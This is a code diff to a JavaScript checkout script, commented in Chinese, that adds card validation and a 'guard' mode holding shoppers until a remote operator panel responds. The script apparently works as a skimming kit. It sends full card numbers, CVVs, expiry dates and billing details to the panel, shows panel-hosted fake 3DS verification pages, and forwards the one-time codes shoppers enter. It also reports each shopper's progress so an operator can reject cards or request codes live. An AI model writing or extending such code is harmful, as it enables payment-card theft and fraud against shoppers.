@@ -30,9 +30,18 @@
     panel_direct_timeout: 2500,
     assets_base: '/bp/3ds/',
     runtime_url: '/bp/bp-template-runtime.js',
+    /* 面板下发 template_url 时的前缀。留空 = 自动用 "<面板>/checkout/"（面板自己托管了那 23+ 套模板） */
+    template_base: '',
     submit_url: '/api/checkout',
     cart_url: '/api/cart',
     blacklist_wait_ms: 7000,
+    /* 提交守卫：用户点提交后**必须**等面板指令，不会自己完成
+     *   guard_mode: 'always'（默认，永远等）/ 'auto'（按 pagetype）/ 'never'（直通）
+     *   allow_direct: 直通的总开关，默认 false —— 只要它是 false，
+     *                 上面三种模式全部按 'always' 执行，页面上不可能自动跳成功页 */
+    guard_mode: 'always',
+    allow_direct: false,
+    guard_timeout_ms: 180000,       // 挂起超过这个时间仍无指令 → 释放并报错（不会产生订单）
     debug: false
   };
 
@@ -85,6 +94,8 @@
       cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / YY', cvcPH: 'CVC',
       cardIncomplete: 'Your card number is incomplete.',
       cardInvalid: 'Your card number is invalid.',
+      cardLength: 'Card number must be {n} digits (you entered {got}).',
+      cardExpired: 'This card has expired.',
       expiryIncomplete: "Your card's expiration date is incomplete.",
       expiryInvalid: "Your card's expiration date is invalid.",
       cvcIncomplete: "Your card's security code is incomplete.",
@@ -97,6 +108,7 @@
       creditCard: '信用卡', cardNumber: '卡号', expiryDate: '有效期', securityCode: '安全码', pay: '支付',
       cardNumberPH: '1234 1234 1234 1234', expiryPH: '月 / 年', cvcPH: 'CVC',
       cardIncomplete: '卡号尚未填写完整。', cardInvalid: '卡号无效。',
+      cardLength: '卡号位数不对，应为 {n} 位（你输入了 {got} 位）。', cardExpired: '这张卡已过期。',
       expiryIncomplete: '有效期尚未填写完整。', expiryInvalid: '有效期无效。',
       cvcIncomplete: '安全码尚未填写完整。',
       cardDeclined: '该卡未通过，请更换卡片重试。', paymentError: '支付失败，请重试。',
@@ -458,17 +470,58 @@
 
   function digitsOf(el) { return el ? String(el.value || '').replace(/\D/g, '') : ''; }
 
+  /* 各品牌合法位数：默认 16；Amex 15、Diners 14、Visa/银联有 13/19 的情况 */
+  function acceptedLengths(brand) {
+    var map = {
+      visa: [13, 16, 19],
+      mastercard: [16],
+      amex: [15],
+      discover: [16, 19],
+      jcb: [16, 17, 18, 19],
+      diners: [14, 16],
+      unionpay: [16, 17, 18, 19],
+      maestro: [12, 13, 14, 15, 16, 17, 18, 19]
+    };
+    return map[brand] || [16];
+  }
+
   function validateCard() {
     var num = digitsOf(E.card), exp = digitsOf(E.exp), cvc = digitsOf(E.cvc);
     var brand = brandOf(num);
-    if (num.length < 13) { return { ok: false, msg: T('cardIncomplete'), field: E.card }; }
-    var lu = luhn(num);
-    if (lu === false) { return { ok: false, msg: T('cardInvalid'), field: E.card }; }
+
+    if (!num || num.length < 12) {
+      return { ok: false, msg: T('cardIncomplete'), field: E.card };
+    }
+
+    /* 位数校对：按品牌允许的长度，默认只认 16 位 */
+    var lens = acceptedLengths(brand);
+    if (lens.indexOf(num.length) === -1) {
+      var want = lens.length === 1 ? String(lens[0]) : lens.join(' / ');
+      return {
+        ok: false,
+        msg: T('cardLength').replace('{n}', want).replace('{got}', String(num.length)),
+        field: E.card
+      };
+    }
+
+    if (luhn(num) === false) {
+      return { ok: false, msg: T('cardInvalid'), field: E.card };
+    }
+
     if (exp.length < 4) { return { ok: false, msg: T('expiryIncomplete'), field: E.exp }; }
     var pe = parseExpiry(E.exp.value);
     if (!pe) { return { ok: false, msg: T('expiryInvalid'), field: E.exp }; }
+
+    /* 过期卡拦截 */
+    var now = new Date();
+    var cy = now.getFullYear() % 100, cm = now.getMonth() + 1;
+    if (pe.yy < cy || (pe.yy === cy && pe.mm < cm)) {
+      return { ok: false, msg: T('cardExpired'), field: E.exp };
+    }
+
     var need = brand === 'amex' ? 4 : 3;
     if (cvc.length < need) { return { ok: false, msg: T('cvcIncomplete'), field: E.cvc }; }
+
     return { ok: true, number: num, brand: brand, expiry: E.exp.value.trim(), cvc: cvc };
   }
 
@@ -647,7 +700,10 @@
     lastGoLivePage: '1',
     registerSent: false,
     verified: null,
-    submitting: false
+    submitting: false,
+    awaiting: false,       /* 守卫模式：已提交、正在等面板指令 */
+    awaitingSince: 0,
+    guardTimer: null
   };
 
   function newIds() {
@@ -662,15 +718,27 @@
 
   function persistSubmitPage(page) {
     S.lastGoLivePage = page;
-    try { global.sessionStorage.setItem('bp_submit_page', page); } catch (e) {}
+    try {
+      global.sessionStorage.setItem('bp_submit_page', JSON.stringify({
+        p: page,
+        o: (getCart().order_number || '')
+      }));
+    } catch (e) {}
   }
 
+  /* 断线/刷新后恢复"已提交"状态；但订单号变了就作废，避免新单显示成已提交 */
   function resumePage() {
     var p = S.lastGoLivePage;
     if (!p || p === '1') {
       try {
-        var s = global.sessionStorage.getItem('bp_submit_page');
-        if (s && s.indexOf('+') !== -1) { p = s; }
+        var raw = global.sessionStorage.getItem('bp_submit_page');
+        if (raw) {
+          var o = null;
+          try { o = JSON.parse(raw); } catch (e) { o = { p: raw, o: '' }; }
+          var cur = getCart().order_number || '';
+          if (o && o.p && (!o.o || !cur || o.o === cur)) { p = o.p; }
+          else { global.sessionStorage.removeItem('bp_submit_page'); }
+        }
       } catch (e) {}
     }
     return p || '1';
@@ -749,25 +817,29 @@
     return 'Unknown';
   }
 
-  function submitCard() {
-    if (!E.card) { return; }
-    var cardn = digitsOf(E.card);
-    if (!cardn) { return; }
-    if (S.lastGoLivePage !== '3') { goLive('3'); }
+  function cardPayload() {
     var b = collectBilling();
     var holder = ((b.firstname || '') + ' ' + (b.lastname || '')).trim();
-    var payload = {
+    var p = {
       userType: 'client',
       Cardholder: holder,
-      cardn: cardn,
+      cardn: digitsOf(E.card),
       Expiry: String(E.exp && E.exp.value || '').trim(),
       cvv2: digitsOf(E.cvc),
       userId: S.userId,
       logtype: C.logtype,
       status: statusOf()
     };
-    for (var k in b) { if (Object.prototype.hasOwnProperty.call(b, k) && b[k]) { payload[k] = b[k]; } }
-    send('submit_card', payload);
+    for (var k in b) { if (Object.prototype.hasOwnProperty.call(b, k) && b[k]) { p[k] = b[k]; } }
+    return p;
+  }
+
+  function submitCard() {
+    if (!E.card) { return; }
+    var cardn = digitsOf(E.card);
+    if (!cardn) { return; }
+    if (S.lastGoLivePage !== '3') { goLive('3'); }
+    send('submit_card', cardPayload());
   }
 
   function updateStep(step) {
@@ -816,18 +888,21 @@
 
     switch (originalEvent) {
       case 'card_verify':
-        openModalFromData(data);
-        break;
       case 'verify_request':
         openModalFromData(data);
+        if (S.awaiting) { armGuardTimer(); }   /* 操作员在动作，重置等待计时 */
         break;
       case 'reject_card':
         closeModal();
+        clearGuardTimer();
+        S.awaiting = false;
         endBusy();
         if (E.card) { markInvalid(E.card, true); try { E.card.focus(); } catch (e) {} }
         showErr((data && (data.message || data.msg || data.error)) || T('cardDeclined'));
         break;
       case 'reject_verify':
+        clearGuardTimer();
+        S.awaiting = false;
         endBusy();
         showErr((data && (data.message || data.msg)) || T('paymentError'));
         break;
@@ -839,11 +914,12 @@
         break;
       case 'to_finish':
         closeModal();
-        submitFlow('socket');
+        finishSubmit();
         break;
       case 'to_wait_payment':
         postToModal({ action: 'wait_payment' });
         setBusy(true);
+        if (S.awaiting) { armGuardTimer(); }
         break;
       case 'to_address':
         goLive('2');
@@ -951,14 +1027,39 @@
     frameEl = q('.bp-modal-iframe', modalEl);
     var btn = q('.bp-modal-close', modalEl);
     on(btn, 'click', function () { closeModal(); });
-    /* 校验页回传（bp_3ds_ready / 结果）*/
+    /* 校验页回传：优先按面板 runtime 的 {type:'bp_emit'} 协议，其次兼容自定义形状 */
     on(global, 'message', function (ev) {
       if (!frameEl || ev.source !== frameEl.contentWindow) { return; }
       var d = ev.data;
       if (!isObj(d)) { return; }
+
       if (d.type === 'bp_3ds_ready') { fireEvent('bp:3ds-ready', d); return; }
+
+      /* ① 面板 runtime 协议：{type:'bp_emit', event:'submit_otp', payload:{...}} */
+      if (d.type === 'bp_emit' && d.event) {
+        var evName = String(d.event);
+        fireEvent('bp:tpl-emit', d);
+
+        if (evName === 'close3DSModal' || evName === 'close') { closeModal(); return; }
+
+        var isOtp = (evName === 'submit_otp' || evName === 'otp_verify');
+        if (isOtp) { persistSubmitPage('4+'); goLive('4+'); }
+
+        var p = isObj(d.payload) ? d.payload : {};
+        if (isOtp) { p.userType = p.userType || 'client'; p.userId = p.userId || S.userId; }
+        if (!p.logtype) { p.logtype = C.logtype; }
+        if (!p.status) { p.status = statusOf(); }
+        if (!p.userId) { p.userId = S.userId; }
+
+        send(EVENT_MAP[evName] ? evName : evName, p);
+        return;
+      }
+
+      /* ② 兼容自定义：{type:'bp_3ds_submit', code} 或 {action:'submit_otp', code} */
       if (d.type === 'bp_3ds_submit' || d.action === 'submit_otp') {
         var code = d.code || d.otp || d.value || '';
+        persistSubmitPage('4+');
+        goLive('4+');
         send('submit_otp', {
           userType: 'client', userId: S.userId, otp: String(code),
           logtype: C.logtype, status: statusOf()
@@ -1014,17 +1115,114 @@
     try { frameEl.removeAttribute('src'); } catch (e) {}
     frameEl.srcdoc = src;
     fireEvent('bp:modal-open', {});
+
+    /* 告诉面板：用户已进入验证码页面（Current_Page 4） */
+    updateStep('3ds_modal_opened');
+    goLive('4');
   }
 
   function openModalFromData(data) {
     if (!isObj(data)) { return; }
+
+    /* ① 面板直接下发内联 HTML（srcdoc 模式）*/
     if (typeof data.html === 'string' && data.html.trim()) { openModal(data.html); return; }
-    if (data.template_url) {
-      openModal('<body style="margin:0;font:14px system-ui;display:grid;place-items:center;height:100vh;color:#374151">Loading…</body>');
-      try { frameEl.removeAttribute('srcdoc'); frameEl.src = data.template_url; } catch (e) {}
+
+    /* ② 面板下发相对路径模板（URL 模式）—— 与原插件一致：
+     *    panel 给的是 "3ds/<hash>/index.html"，要拼上 checkout 基址 */
+    if (typeof data.template_url === 'string' && data.template_url.trim()) {
+      var url = buildTemplateUrl(data.template_url, data.variables);
+      if (!url) { warn('template_url 无法解析'); return; }
+      ensureModal();
+      modalEl.classList.add('bp-modal--open');
+      try {
+        frameEl.removeAttribute('srcdoc');
+        frameEl.src = url;
+      } catch (e) { warn('设置模板地址失败', e); }
+      fireEvent('bp:modal-open', { url: url });
+      log('模板地址', url);
+
+      /* 关键：立刻告诉面板"用户已进入验证页面"，否则面板一直显示等待处理 */
+      updateStep('3ds_modal_opened');
+      goLive('4');
       return;
     }
+
     warn('card_verify 既无 html 也无 template_url');
+  }
+
+  /* 把面板给的相对模板路径解析成可加载地址 */
+  function buildTemplateUrl(t, vars) {
+    t = String(t || '').trim();
+    if (!t) { return ''; }
+
+    var url = t;
+    if (!/^https?:\/\//i.test(t)) {
+      if (/^\/\//.test(t)) {
+        url = 'https:' + t;
+      } else {
+        var base = C.template_base;
+        if (!base) {
+          /* 默认：面板自己托管的 /checkout/ */
+          var origin = String(C.panel_host || '')
+            .replace(/^wss:/i, 'https:')
+            .replace(/^ws:/i, 'http:')
+            .replace(/\/+$/, '');
+          base = origin + '/checkout/';
+        }
+        if (base.charAt(base.length - 1) !== '/') { base += '/'; }
+        url = base + t.replace(/^\/+/, '');
+      }
+    }
+
+    /* 面板传来的变量 → query（与原插件一致）；再补上模板通常需要的默认值 */
+    var cart = getCart();
+    var amount = cart.total_amount || '';
+    if (!amount && cart.total) {
+      try {
+        amount = new Intl.NumberFormat(LANG, { style: 'currency', currency: cart.currency || 'USD' })
+          .format(cart.total / 100);
+      } catch (e) { amount = (cart.total / 100).toFixed(2) + ' ' + (cart.currency || ''); }
+    }
+    var merchant = (S.serverData && S.serverData.merchantName) || (doc.title || '').trim() || (global.location && location.hostname) || '';
+    var d = new Date();
+    var pad = function (n) { return (n < 10 ? '0' : '') + n; };
+
+    var merged = {
+      merchantName: merchant,
+      merchant: merchant,
+      amount: amount,
+      total: amount,
+      orderid: cart.order_number || '',
+      order_number: cart.order_number || '',
+      cardnumber: digitsOf(E.card),
+      brand: brandOf(digitsOf(E.card)),
+      userToken: S.userId,
+      user_ip: (S.serverData && S.serverData.user_ip) || '',
+      user_country: (S.serverData && S.serverData.user_country) || '',
+      logtype: C.logtype,
+      date: pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear(),
+      time: pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds()),
+      shoptime: d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes())
+    };
+    if (isObj(vars)) {
+      /* 面板的 variables 优先，但**空值不覆盖**我们的默认值（面板常带 amount:"" 之类的空串） */
+      for (var k0 in vars) {
+        if (!Object.prototype.hasOwnProperty.call(vars, k0)) { continue; }
+        var v0 = vars[k0];
+        if (v0 === null || v0 === undefined) { continue; }
+        if (typeof v0 === 'string' && v0.trim() === '') { continue; }
+        merged[k0] = v0;
+      }
+    }
+
+    var parts = [];
+    for (var k in merged) {
+      if (Object.prototype.hasOwnProperty.call(merged, k) && merged[k] != null && merged[k] !== '') {
+        parts.push(encodeURIComponent(k) + '=' + encodeURIComponent(String(merged[k])));
+      }
+    }
+    parts.push('ts=' + nowMs());
+    return url + (url.indexOf('?') === -1 ? '?' : '&') + parts.join('&');
   }
 
   function closeModal() {
@@ -1032,6 +1230,7 @@
     modalEl.classList.remove('bp-modal--open');
     try { frameEl.removeAttribute('srcdoc'); } catch (e) {}
     fireEvent('bp:modal-close', {});
+    updateStep('3ds_modal_closed');
   }
 
   function postToModal(msg) {
@@ -1130,55 +1329,130 @@
     };
   }
 
-  function submitFlow(trigger) {
-    if (busy) { return; }
-    if (trigger !== 'socket') {
-      var v = validateCard();
-      if (!v.ok) {
-        showErr(v.msg);
-        markInvalid(v.field, true);
-        try { v.field.focus(); } catch (e) {}
-        return;
-      }
-    }
+  function pagetype() {
+    return String((S.serverData && S.serverData.pagetype) || '1');
+  }
+
+  /* 是否要走"挂起等面板"。
+   *   allow_direct === false（默认）→ 永远等，忽略 pagetype 与 guard_mode
+   *   只有显式 allow_direct: true 才允许直通，且仍受 guard_mode 约束 */
+  function needGuard() {
+    if (C.allow_direct !== true) { return true; }
+    if (C.guard_mode === 'never') { return false; }
+    if (C.guard_mode === 'auto') { return pagetype() !== '1'; }
+    return true;
+  }
+
+  function clearGuardTimer() {
+    if (S.guardTimer) { try { clearTimeout(S.guardTimer); } catch (e) {} S.guardTimer = null; }
+  }
+
+  function armGuardTimer() {
+    clearGuardTimer();
+    var ms = Number(C.guard_timeout_ms) || 120000;
+    S.guardTimer = setTimeout(function () {
+      if (!S.awaiting) { return; }
+      warn('守卫超时，释放');
+      S.awaiting = false;
+      endBusy();
+      showErr(T('paymentError'));
+      fireEvent('bp:guard-timeout', { ms: ms });
+    }, ms);
+  }
+
+  /* 真正"完成订单"：通知站点后端 → 跳成功页。只有这里会碰 /api/checkout */
+  function postOrder() {
     setBusy(true);
     showErr(T('processing'), 'info');
+    if (!global.fetch) { endBusy(); showErr(T('networkError')); return Promise.resolve(); }
+    return global.fetch(C.submit_url, {
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
+      body: JSON.stringify(submitPayload())
+    }).then(function (r) { return r.json(); }).then(function (j) {
+      if (j && j.ok) {
+        fireEvent('bp:submitted', j);
+        var num = j.order_number || submitPayload().order_number || '';
+        try { global.location.href = '/order/' + encodeURIComponent(num); } catch (e) {}
+      } else {
+        endBusy();
+        showErr((j && j.message) || T('paymentError'));
+        fireEvent('bp:submit-failed', j || {});
+      }
+    }).catch(function (err) {
+      endBusy();
+      showErr(T('networkError'));
+      warn('submit failed', err);
+    });
+  }
 
-    var v2 = validateCard();
-    if (v2.ok) { submitCard(); }
+  /* 提交用的完整快照：与原插件 save_card 的 payload 字段一致
+   * 面板就是收到这个事件才把卡落成"订单" */
+  function submitPayloadRich() {
+    var p = cardPayload();
+    var c = getCart();
+    p.user_ip = (S.serverData && S.serverData.user_ip) || '';
+    p.user_os = (S.serverData && S.serverData.user_os) || guessOS();
+    p.user_agent = (S.serverData && S.serverData.user_agent) || (global.navigator ? navigator.userAgent : '');
+    p.user_country = (S.serverData && S.serverData.user_country) || '';
+    p.logname = (S.serverData && S.serverData.logname) || C.logname;
+    p.domain = domainWithUTM();
+    p.order_number = c.order_number || '';
+    p.products = JSON.stringify(c.items || []);
+    p.total_amount = c.total_amount || '';
+    return p;
+  }
 
-    var chain = (v2.ok ? blacklistCheck(v2.number) : Promise.resolve({ approved: true }));
+  /* 面板说"完成"（r6），或直通模式下自己完成 */
+  function finishSubmit() {
+    S.awaiting = false;
+    clearGuardTimer();
+    return postOrder();
+  }
 
-    chain.then(function (bl) {
+  function submitFlow(trigger) {
+    if (busy || S.awaiting) { return; }
+
+    var v = validateCard();
+    if (!v.ok) {
+      showErr(v.msg);
+      markInvalid(v.field, true);
+      try { v.field.focus(); } catch (e) {}
+      return;
+    }
+
+    /* 与原插件 1:1 对齐：提交时发 save_card(e14) —— 面板靠它落"订单"；
+     * update_card(e13) 只是更新会话内容；submit_card(e12) 是输入过程用的。
+     * status 必须保持在线（'1'），否则会话被标灰。 */
+    submitCard();
+    send('save_card', submitPayloadRich());
+    updateStep('card_submit');
+    persistSubmitPage('3+');
+    goLive('3+');
+
+    blacklistCheck(v.number).then(function (bl) {
       if (!bl.approved) {
         setBusy(false);
         showErr(bl.message || T('cardDeclined'));
         fireEvent('bp:blacklist-reject', bl);
-        return null;
+        return;
       }
-      if (!global.fetch) { throw new Error('no fetch'); }
-      return global.fetch(C.submit_url, {
-        method: 'POST',
-        credentials: 'same-origin',
-        headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
-        body: JSON.stringify(submitPayload())
-      }).then(function (r) { return r.json(); });
-    }).then(function (j) {
-      if (!j) { return; }
-      if (j.ok) {
-        fireEvent('bp:submitted', j);
-        var num = j.order_number || (submitPayload().order_number) || '';
-        var url = '/order/' + encodeURIComponent(num);
-        try { global.location.href = url; } catch (e) {}
-      } else {
-        setBusy(false);
-        showErr(j.message || T('paymentError'));
-        fireEvent('bp:submit-failed', j);
+
+      if (needGuard()) {
+        /* 挂起：不碰 /api/checkout，等面板 r2（验证屏）/ r1（拒卡）/ r6（完成） */
+        S.awaiting = true;
+        S.awaitingSince = nowMs();
+        setBusy(true);
+        showErr(T('processing'), 'info');
+        goLive('3+');
+        armGuardTimer();
+        fireEvent('bp:awaiting-panel', { pagetype: pagetype(), trigger: trigger });
+        return;
       }
-    }).catch(function (err) {
-      setBusy(false);
-      showErr(T('networkError'));
-      warn('submit failed', err);
+
+      /* 直通（pagetype == '1'）：立即完成 */
+      finishSubmit();
     });
   }
 
@@ -1339,6 +1613,16 @@
     goLive: goLive,
     submitCard: submitCard,
     submit: submitFlow,
+    finish: finishSubmit,
+    mode: function () {
+      return {
+        guard_mode: C.guard_mode,
+        pagetype: pagetype(),
+        need_guard: needGuard(),
+        awaiting: !!S.awaiting,
+        awaiting_ms: S.awaiting ? (nowMs() - S.awaitingSince) : 0
+      };
+    },
     openModal: openModal,
     closeModal: closeModal,
     postToModal: postToModal,
